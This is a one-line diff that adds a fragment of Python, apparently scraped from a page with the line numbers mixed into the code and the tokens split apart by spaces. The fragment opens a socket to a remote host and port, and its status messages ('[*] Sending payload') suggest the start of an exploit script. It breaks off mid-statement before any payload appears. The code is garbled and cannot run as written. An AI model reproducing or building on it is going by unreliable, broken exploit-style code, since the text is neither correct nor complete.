@@ -1,0 +1,1 @@
+print ( f " [*] Connecting to { rhost } : { rport } " ) 14 s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) 15 try : 16 s . connect (( rhost , int ( rport ))) 17 except : 18 print ( f " [-] Failed to connect to { rhost } : { rport } " ) 19 sys . exit ( 1 ) 20 s . recv ( 100 ) 21 22 print ( " [*] Sending payload " ) 23 s . send ( f "
